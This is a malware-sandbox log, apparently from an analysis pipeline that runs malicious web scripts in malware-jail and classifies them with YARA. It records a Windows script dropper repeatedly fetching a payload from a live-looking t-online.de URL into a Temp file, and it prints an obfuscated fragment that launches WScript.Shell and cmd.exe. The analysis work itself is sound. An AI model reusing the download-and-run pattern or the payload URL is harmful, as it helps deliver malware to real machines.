+18 May 18:42:34 - ADODB_Stream[45].Open()
+18 May 18:42:34 - ADODB_Stream[45].type.get() => (number) '2'
+18 May 18:42:34 - ADODB_Stream[45].charset.get() => (string) '437'
+18 May 18:42:34 - ADODB_Stream[45].charset.get() => (string) '437'
+18 May 18:42:34 - ADODB_Stream[45].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:34 - ADODB_Stream[45].charset.get() => (string) '437'
+18 May 18:42:34 - ADODB_Stream[45].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:34 - ADODB_Stream[45].LoadFromFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7) 27 bytes, encoding: 437
+18 May 18:42:34 - ADODB_Stream[45].position = (number) '0'
+18 May 18:42:34 - ADODB_Stream[45].Close()
+18 May 18:42:34 - >>> Silencing catch TypeError: IBx3[((OBc + NOs) + Pp)] is not a function
+    at St (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:667:30)
+    at OMb (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:527:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:461:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js:21:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:34 - WScript.Sleep(1000)
+18 May 18:42:35 - Scripting.FileSystemObject[21].FileExists(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7.dll) => false
+18 May 18:42:35 - MSXML2.XMLHTTP[20].open(GET,http://wm08g63hd.homepage.t-online.de/8kkap,false)
+18 May 18:42:35 - MSXML2.XMLHTTP[20].method = (string) 'GET'
+18 May 18:42:35 - MSXML2.XMLHTTP[20].url = (string) 'http://wm08g63hd.homepage.t-online.de/8kkap'
+18 May 18:42:35 - MSXML2.XMLHTTP[20].async = (boolean) 'false'
+18 May 18:42:35 - MSXML2.XMLHTTP[20].send(undefined)
+18 May 18:42:35 - MSXML2.XMLHTTP[20] Intentionally returning HTTP/404
+18 May 18:42:35 - MSXML2.XMLHTTP[20].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:35 - MSXML2.XMLHTTP[20].status = (number) '404'
+18 May 18:42:35 - MSXML2.XMLHTTP[20].readystate = (number) '4'
+18 May 18:42:35 - MSXML2.XMLHTTP[20].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:35 - MSXML2.XMLHTTP[20].send(undefined) finished
+18 May 18:42:35 - MSXML2.XMLHTTP[20].readystate.get() => (number) '4'
+18 May 18:42:35 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:35 - new ADODB_Stream[46]
+18 May 18:42:35 - ADODB_Stream[46].Open()
+18 May 18:42:35 - ADODB_Stream[46].type = (number) '1'
+18 May 18:42:35 - MSXML2.XMLHTTP[20].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:35 - ADODB_Stream[46].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:35 - ADODB_Stream[46].Write(str) - 27 bytes
+18 May 18:42:35 - ADODB_Stream[46].size = (number) '27'
+18 May 18:42:35 - ADODB_Stream[46].position = (number) '0'
+18 May 18:42:35 - ADODB_Stream[46].SaveToFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7, 2)
+18 May 18:42:35 - ADODB_Stream[46].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:35 - ADODB_Stream[46].Close()
+18 May 18:42:35 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:35 - new ADODB_Stream[47]
+18 May 18:42:35 - ADODB_Stream[47].type = (number) '2'
+18 May 18:42:35 - ADODB_Stream[47].charset = (string) '437'
+18 May 18:42:35 - ADODB_Stream[47].Open()
+18 May 18:42:35 - ADODB_Stream[47].type.get() => (number) '2'
+18 May 18:42:35 - ADODB_Stream[47].charset.get() => (string) '437'
+18 May 18:42:35 - ADODB_Stream[47].charset.get() => (string) '437'
+18 May 18:42:35 - ADODB_Stream[47].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:35 - ADODB_Stream[47].charset.get() => (string) '437'
+18 May 18:42:35 - ADODB_Stream[47].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:35 - ADODB_Stream[47].LoadFromFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7) 27 bytes, encoding: 437
+18 May 18:42:35 - ADODB_Stream[47].position = (number) '0'
+18 May 18:42:35 - ADODB_Stream[47].Close()
+18 May 18:42:35 - >>> Silencing catch TypeError: IBx3[((OBc + NOs) + Pp)] is not a function
+    at St (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:667:30)
+    at OMb (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:527:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:461:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js:21:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:35 - WScript.Sleep(1000)
+18 May 18:42:36 - Scripting.FileSystemObject[21].FileExists(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7.dll) => false
+18 May 18:42:36 - MSXML2.XMLHTTP[20].open(GET,http://wm08g63hd.homepage.t-online.de/8kkap,false)
+18 May 18:42:36 - MSXML2.XMLHTTP[20].method = (string) 'GET'
+18 May 18:42:36 - MSXML2.XMLHTTP[20].url = (string) 'http://wm08g63hd.homepage.t-online.de/8kkap'
+18 May 18:42:36 - MSXML2.XMLHTTP[20].async = (boolean) 'false'
+18 May 18:42:36 - MSXML2.XMLHTTP[20].send(undefined)
+18 May 18:42:36 - MSXML2.XMLHTTP[20] Intentionally returning HTTP/404
+18 May 18:42:36 - MSXML2.XMLHTTP[20].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:36 - MSXML2.XMLHTTP[20].status = (number) '404'
+18 May 18:42:36 - MSXML2.XMLHTTP[20].readystate = (number) '4'
+18 May 18:42:36 - MSXML2.XMLHTTP[20].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:36 - MSXML2.XMLHTTP[20].send(undefined) finished
+18 May 18:42:36 - MSXML2.XMLHTTP[20].readystate.get() => (number) '4'
+18 May 18:42:36 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:36 - new ADODB_Stream[48]
+18 May 18:42:36 - ADODB_Stream[48].Open()
+18 May 18:42:36 - ADODB_Stream[48].type = (number) '1'
+18 May 18:42:36 - MSXML2.XMLHTTP[20].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:36 - ADODB_Stream[48].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:36 - ADODB_Stream[48].Write(str) - 27 bytes
+18 May 18:42:36 - ADODB_Stream[48].size = (number) '27'
+18 May 18:42:36 - ADODB_Stream[48].position = (number) '0'
+18 May 18:42:36 - ADODB_Stream[48].SaveToFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7, 2)
+18 May 18:42:36 - ADODB_Stream[48].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:36 - ADODB_Stream[48].Close()
+18 May 18:42:36 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:36 - new ADODB_Stream[49]
+18 May 18:42:36 - ADODB_Stream[49].type = (number) '2'
+18 May 18:42:36 - ADODB_Stream[49].charset = (string) '437'
+18 May 18:42:36 - ADODB_Stream[49].Open()
+18 May 18:42:36 - ADODB_Stream[49].type.get() => (number) '2'
+18 May 18:42:36 - ADODB_Stream[49].charset.get() => (string) '437'
+18 May 18:42:36 - ADODB_Stream[49].charset.get() => (string) '437'
+18 May 18:42:36 - ADODB_Stream[49].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:36 - ADODB_Stream[49].charset.get() => (string) '437'
+18 May 18:42:36 - ADODB_Stream[49].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:36 - ADODB_Stream[49].LoadFromFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7) 27 bytes, encoding: 437
+18 May 18:42:36 - ADODB_Stream[49].position = (number) '0'
+18 May 18:42:36 - ADODB_Stream[49].Close()
+18 May 18:42:36 - >>> Silencing catch TypeError: IBx3[((OBc + NOs) + Pp)] is not a function
+    at St (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:667:30)
+    at OMb (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:527:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:461:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js:21:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:36 - WScript.Sleep(1000)
+18 May 18:42:37 - Scripting.FileSystemObject[21].FileExists(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7.dll) => false
+18 May 18:42:37 - MSXML2.XMLHTTP[20].open(GET,http://wm08g63hd.homepage.t-online.de/8kkap,false)
+18 May 18:42:37 - MSXML2.XMLHTTP[20].method = (string) 'GET'
+18 May 18:42:37 - MSXML2.XMLHTTP[20].url = (string) 'http://wm08g63hd.homepage.t-online.de/8kkap'
+18 May 18:42:37 - MSXML2.XMLHTTP[20].async = (boolean) 'false'
+18 May 18:42:37 - MSXML2.XMLHTTP[20].send(undefined)
+18 May 18:42:37 - MSXML2.XMLHTTP[20] Intentionally returning HTTP/404
+18 May 18:42:37 - MSXML2.XMLHTTP[20].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:37 - MSXML2.XMLHTTP[20].status = (number) '404'
+18 May 18:42:37 - MSXML2.XMLHTTP[20].readystate = (number) '4'
+18 May 18:42:37 - MSXML2.XMLHTTP[20].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:37 - MSXML2.XMLHTTP[20].send(undefined) finished
+18 May 18:42:37 - MSXML2.XMLHTTP[20].readystate.get() => (number) '4'
+18 May 18:42:37 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:37 - new ADODB_Stream[50]
+18 May 18:42:37 - ADODB_Stream[50].Open()
+18 May 18:42:37 - ADODB_Stream[50].type = (number) '1'
+18 May 18:42:37 - MSXML2.XMLHTTP[20].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:37 - ADODB_Stream[50].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:37 - ADODB_Stream[50].Write(str) - 27 bytes
+18 May 18:42:37 - ADODB_Stream[50].size = (number) '27'
+18 May 18:42:37 - ADODB_Stream[50].position = (number) '0'
+18 May 18:42:37 - ADODB_Stream[50].SaveToFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7, 2)
+18 May 18:42:37 - ADODB_Stream[50].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:37 - ADODB_Stream[50].Close()
+18 May 18:42:37 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:37 - new ADODB_Stream[51]
+18 May 18:42:37 - ADODB_Stream[51].type = (number) '2'
+18 May 18:42:37 - ADODB_Stream[51].charset = (string) '437'
+18 May 18:42:37 - ADODB_Stream[51].Open()
+18 May 18:42:37 - ADODB_Stream[51].type.get() => (number) '2'
+18 May 18:42:37 - ADODB_Stream[51].charset.get() => (string) '437'
+18 May 18:42:37 - ADODB_Stream[51].charset.get() => (string) '437'
+18 May 18:42:37 - ADODB_Stream[51].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:37 - ADODB_Stream[51].charset.get() => (string) '437'
+18 May 18:42:37 - ADODB_Stream[51].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:37 - ADODB_Stream[51].LoadFromFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7) 27 bytes, encoding: 437
+18 May 18:42:37 - ADODB_Stream[51].position = (number) '0'
+18 May 18:42:37 - ADODB_Stream[51].Close()
+18 May 18:42:37 - >>> Silencing catch TypeError: IBx3[((OBc + NOs) + Pp)] is not a function
+    at St (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:667:30)
+    at OMb (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:527:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:461:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js:21:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:37 - WScript.Sleep(1000)
+18 May 18:42:38 - Scripting.FileSystemObject[21].FileExists(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7.dll) => false
+18 May 18:42:38 - MSXML2.XMLHTTP[20].open(GET,http://wm08g63hd.homepage.t-online.de/8kkap,false)
+18 May 18:42:38 - MSXML2.XMLHTTP[20].method = (string) 'GET'
+18 May 18:42:38 - MSXML2.XMLHTTP[20].url = (string) 'http://wm08g63hd.homepage.t-online.de/8kkap'
+18 May 18:42:38 - MSXML2.XMLHTTP[20].async = (boolean) 'false'
+18 May 18:42:38 - MSXML2.XMLHTTP[20].send(undefined)
+18 May 18:42:38 - MSXML2.XMLHTTP[20] Intentionally returning HTTP/404
+18 May 18:42:38 - MSXML2.XMLHTTP[20].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:38 - MSXML2.XMLHTTP[20].status = (number) '404'
+18 May 18:42:38 - MSXML2.XMLHTTP[20].readystate = (number) '4'
+18 May 18:42:38 - MSXML2.XMLHTTP[20].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:38 - MSXML2.XMLHTTP[20].send(undefined) finished
+18 May 18:42:38 - MSXML2.XMLHTTP[20].readystate.get() => (number) '4'
+18 May 18:42:38 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:38 - new ADODB_Stream[52]
+18 May 18:42:38 - ADODB_Stream[52].Open()
+18 May 18:42:38 - ADODB_Stream[52].type = (number) '1'
+18 May 18:42:38 - MSXML2.XMLHTTP[20].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:38 - ADODB_Stream[52].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:38 - ADODB_Stream[52].Write(str) - 27 bytes
+18 May 18:42:38 - ADODB_Stream[52].size = (number) '27'
+18 May 18:42:38 - ADODB_Stream[52].position = (number) '0'
+18 May 18:42:38 - ADODB_Stream[52].SaveToFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7, 2)
+18 May 18:42:38 - ADODB_Stream[52].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:38 - ADODB_Stream[52].Close()
+18 May 18:42:38 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:38 - new ADODB_Stream[53]
+18 May 18:42:38 - ADODB_Stream[53].type = (number) '2'
+18 May 18:42:38 - ADODB_Stream[53].charset = (string) '437'
+18 May 18:42:38 - ADODB_Stream[53].Open()
+18 May 18:42:38 - ADODB_Stream[53].type.get() => (number) '2'
+18 May 18:42:38 - ADODB_Stream[53].charset.get() => (string) '437'
+18 May 18:42:38 - ADODB_Stream[53].charset.get() => (string) '437'
+18 May 18:42:38 - ADODB_Stream[53].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:38 - ADODB_Stream[53].charset.get() => (string) '437'
+18 May 18:42:38 - ADODB_Stream[53].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:38 - ADODB_Stream[53].LoadFromFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7) 27 bytes, encoding: 437
+18 May 18:42:38 - ADODB_Stream[53].position = (number) '0'
+18 May 18:42:38 - ADODB_Stream[53].Close()
+18 May 18:42:38 - >>> Silencing catch TypeError: IBx3[((OBc + NOs) + Pp)] is not a function
+    at St (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:667:30)
+    at OMb (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:527:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:461:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js:21:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:38 - WScript.Sleep(1000)
+18 May 18:42:39 - Exception occured: object Error: Script execution timed out.
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+    at Object.<anonymous> (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:360:20)
+    at Module._compile (module.js:652:30)
+    at Object.Module._extensions..js (module.js:663:10)
+    at Module.load (module.js:565:32)
+    at tryModuleLoad (module.js:505:12)
+    at Function.Module._load (module.js:497:3)
+    at Function.Module.runMain (module.js:693:10)
+18 May 18:42:39 - ==> Cleaning up sandbox.
+18 May 18:42:39 - ==> Script execution finished, dumping sandbox environment to a file.
+18 May 18:42:39 - The sandbox context has been  saved to: malware-jail/sandbox_dump_after.json
+18 May 18:42:39 - Saving: malware-jail/../malware/localhost_05-18_18-42-0023_8346BE7A/output/eval_1.js
+18 May 18:42:39 - Saving: malware-jail/../malware/localhost_05-18_18-42-0023_8346BE7A/output/C__Users_User_AppData_Local_Temp_tO7i5T0baEMUO7
+18 May 18:42:39 - Saving: malware-jail/../malware/localhost_05-18_18-42-0023_8346BE7A/output/urls.json
+
+[18/05 18:42:39][info]Exporting results to: /results/localhost_18-42-0023.dynamic.log
+[18/05 18:42:39][info]Exporting results to: /results/localhost_18-42-0023.static.log
+[18/05 18:42:39][info]Dynamic URLs extracted from localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js and saved to ./malware/localhost_05-18_18-42-0023_8346BE7A/output/urls.json
+[18/05 18:42:39][info]Initializing YARA localhost_05-18_18-42-0023_8346BE7A/results/ <all files>
+[18/05 18:42:39][info]Process at 29664 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0023_8346BE7A/results]
+[18/05 18:42:39][info]8346BE7A,/malware/localhost_05-18_18-42-0023_8346BE7A/results/ <all files> ,170,Malicious
+[18/05 18:42:39][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:39][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:39][info][A17F353B]Injecting Transaction Monitor
+[18/05 18:42:39][info](A17F353B)Starting job http://localhost/malware_samples/49288c16ca67b7235ced522b86b0e57c.html
+[18/05 18:42:39][info](A17F353B)Last page Navigated to http://localhost/malware_samples/49288c16ca67b7235ced522b86b0e57c.html status: 200 OK date: Sat, 18 May 2019 15:42:39 GMT
+[18/05 18:42:39][info]Found frames: 0
+[18/05 18:42:39][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0039_A17F353B/localhost_18-42-0039.js
+[18/05 18:42:39][info]Processing command for NodeJS in folder localhost_05-18_18-42-0039_A17F353B and file localhost_18-42-0039.js
+[18/05 18:42:39][info]Process at 29699 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0039_A17F353B.json ./malware/localhost_05-18_18-42-0039_A17F353B/localhost_18-42-0039.js]
+[18/05 18:42:40][info]Exporting results to: /results/localhost_18-42-0039.dynamic.log
+[18/05 18:42:40][info]Exporting results to: /results/localhost_18-42-0039.static.log
+[18/05 18:42:40][info]No Dynamic URLs extracted from: localhost_05-18_18-42-0039_A17F353B/localhost_18-42-0039.js
+[18/05 18:42:40][info]Initializing YARA localhost_05-18_18-42-0039_A17F353B/results/ <all files>
+[18/05 18:42:40][info]Process at 29715 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0039_A17F353B/results]
+[18/05 18:42:40][info]A17F353B,/malware/localhost_05-18_18-42-0039_A17F353B/results/ <all files> ,80,Malicious
+[18/05 18:42:40][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:40][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:40][info][87E4126C]Injecting Transaction Monitor
+[18/05 18:42:40][info](87E4126C)Starting job http://localhost/malware_samples/1eccb15cfa615a708907718781f36891.html
+[18/05 18:42:40][info](87E4126C)Last page Navigated to http://localhost/malware_samples/1eccb15cfa615a708907718781f36891.html status: 200 OK date: Sat, 18 May 2019 15:42:40 GMT
+[18/05 18:42:40][info]Found frames: 0
+[18/05 18:42:40][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0040_87E4126C/localhost_18-42-0040.js
+[18/05 18:42:40][info]Processing command for NodeJS in folder localhost_05-18_18-42-0040_87E4126C and file localhost_18-42-0040.js
+[18/05 18:42:40][info]Process at 29749 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0040_87E4126C.json ./malware/localhost_05-18_18-42-0040_87E4126C/localhost_18-42-0040.js]
+[18/05 18:42:40][info]Exporting results to: /results/localhost_18-42-0040.dynamic.log
+[18/05 18:42:40][info]Exporting results to: /results/localhost_18-42-0040.static.log
+[18/05 18:42:40][info]No Dynamic URLs extracted from: localhost_05-18_18-42-0040_87E4126C/localhost_18-42-0040.js
+[18/05 18:42:40][info]Initializing YARA localhost_05-18_18-42-0040_87E4126C/results/ <all files>
+[18/05 18:42:40][info]Process at 29765 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0040_87E4126C/results]
+[18/05 18:42:40][info]localhost_05-18_18-42-0040_87E4126C no_matches 
+[18/05 18:42:40][info]87E4126C,/malware/localhost_05-18_18-42-0040_87E4126C/results/ <all files> ,0,no_matches
+[18/05 18:42:40][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:40][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:40][info][A6FDBFAE]Injecting Transaction Monitor
+[18/05 18:42:40][info](A6FDBFAE)Starting job http://localhost/malware_samples/23ef471e720525eb3dff80c2296d1a60.html
+[18/05 18:42:40][info](A6FDBFAE)Last page Navigated to http://localhost/malware_samples/23ef471e720525eb3dff80c2296d1a60.html status: 200 OK date: Sat, 18 May 2019 15:42:40 GMT
+[18/05 18:42:40][info]Found frames: 0
+[18/05 18:42:40][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0040_A6FDBFAE/localhost_18-42-0040.js
+[18/05 18:42:40][info]Processing command for NodeJS in folder localhost_05-18_18-42-0040_A6FDBFAE and file localhost_18-42-0040.js
+[18/05 18:42:40][info]Process at 29799 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0040_A6FDBFAE.json ./malware/localhost_05-18_18-42-0040_A6FDBFAE/localhost_18-42-0040.js]
+[18/05 18:42:41][warning]Uncaught Exception occured, scanning results might be innacurate: 
+18 May 18:42:41 - mailware-jail, a malware sandbox ver. 0.19
+18 May 18:42:41 - ------------------------
+18 May 18:42:41 - Arguments: --h404 -t 15000 -c ./config_localhost_05-18_18-42-0040_A6FDBFAE.json ./malware/localhost_05-18_18-42-0040_A6FDBFAE/localhost_18-42-0040.js
+18 May 18:42:41 - Sandbox environment sequence: malware-jail/env/utils.js,malware-jail/env/eval.js,malware-jail/env/function.js,malware-jail/env/wscript.js,malware-jail/env/browser.js,malware-jail/env/agents.js,malware-jail/env/other.js,malware-jail/env/console.js
+18 May 18:42:41 - Malware files: ./malware/localhost_05-18_18-42-0040_A6FDBFAE/localhost_18-42-0040.js
+18 May 18:42:41 - Execution timeout set to: 15 seconds
+18 May 18:42:41 - Output file for sandbox dump: malware-jail/sandbox_dump_after.json
+18 May 18:42:41 - Output directory for generated files: malware-jail/../malware/localhost_05-18_18-42-0040_A6FDBFAE/output/
+18 May 18:42:41 - Download from remote server: Return HTTP/404
+18 May 18:42:41 - ==> Preparing Sandbox environment.
+18 May 18:42:41 -  => Executing: malware-jail/env/utils.js quitely
+18 May 18:42:41 -  => Executing: malware-jail/env/eval.js quitely
+18 May 18:42:41 -  => Executing: malware-jail/env/function.js quitely
+18 May 18:42:41 -  => Executing: malware-jail/env/wscript.js quitely
+18 May 18:42:41 -  => Executing: malware-jail/env/browser.js quitely
+18 May 18:42:41 -  => Executing: malware-jail/env/agents.js quitely
+18 May 18:42:41 -  => Executing: malware-jail/env/other.js quitely
+18 May 18:42:41 -  => Executing: malware-jail/env/console.js quitely
+18 May 18:42:41 - ==> Executing malware file(s). =========================================
+18 May 18:42:41 -  => Executing: ./malware/localhost_05-18_18-42-0040_A6FDBFAE/localhost_18-42-0040.js verbosely, reporting silent catches
+18 May 18:42:41 - Saving: malware-jail/../malware/localhost_05-18_18-42-0040_A6FDBFAE/output/._malware_localhost_05-18_18-42-0040_A6FDBFAE_localhost_18-42-0040.js
+18 May 18:42:41 - Saving: malware-jail/../malware/localhost_05-18_18-42-0040_A6FDBFAE/output/tr_._malware_localhost_05-18_18-42-0040_A6FDBFAE_localhost_18-42-0040.js
+18 May 18:42:41 - WScript.scriptfullname = (string) './malware/localhost_05-18_18-42-0040_A6FDBFAE/localhost_18-42-0040.js'
+18 May 18:42:41 - WScript.arguments = (object) './malware/localhost_05-18_18-42-0040_A6FDBFAE/localhost_18-42-0040.js,xyz'
+18 May 18:42:41 - Calling eval[1]('function e(){?    var _hsiyudgfustdg = "WS"+""+"c"+"r"+"i"+"pt";?    var _c = "\%Sy"+"st"+""+"em"+"Root\%\\s"+"ystem32\\cmd."+"ex"+"e";?     var _87867t67t6gt = this[_hsiyudgfustdg]["Cre"+"ateOb"+"ject"](_hsiyudgfustdg+".She"+"ll"); ?    var _87g6sd5 ... (truncated)')
+18 May 18:42:41 - WScript.CreateObject(WScript.Shell)
+18 May 18:42:41 - new WScript.Shell[14]
+18 May 18:42:41 - new WshEnvironment[15](SYSTEM)
+18 May 18:42:41 - WScript.Shell[14].Environment(SYSTEM)
+18 May 18:42:41 - WshEnvironment[15](SYSTEM)(COMSPEC) => C:\WINDOWS\system32\cmd.exe
+18 May 18:42:41 - Exception occured: object undefined:8
+	else {this[this["_hsiyudgfustdg"]]["Qui"+""+"t"](1);};
+	                                  ^
+
+TypeError: Cannot read property 'Quit' of undefined
+    at e (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:8:36)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:10:1)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0040_A6FDBFAE/localhost_18-42-0040.js:17:1
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+    at Object.<anonymous> (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:360:20)
+18 May 18:42:41 - ==> Cleaning up sandbox.
+18 May 18:42:41 - ==> Script execution finished, dumping sandbox environment to a file.
+18 May 18:42:41 - The sandbox context has been  saved to: malware-jail/sandbox_dump_after.json
+18 May 18:42:41 - Saving: malware-jail/../malware/localhost_05-18_18-42-0040_A6FDBFAE/output/eval_1.js
+
+[18/05 18:42:41][info]Exporting results to: /results/localhost_18-42-0040.dynamic.log
+[18/05 18:42:41][info]Exporting results to: /results/localhost_18-42-0040.static.log
+[18/05 18:42:41][info]No Dynamic URLs extracted from: localhost_05-18_18-42-0040_A6FDBFAE/localhost_18-42-0040.js
+[18/05 18:42:41][info]Initializing YARA localhost_05-18_18-42-0040_A6FDBFAE/results/ <all files>
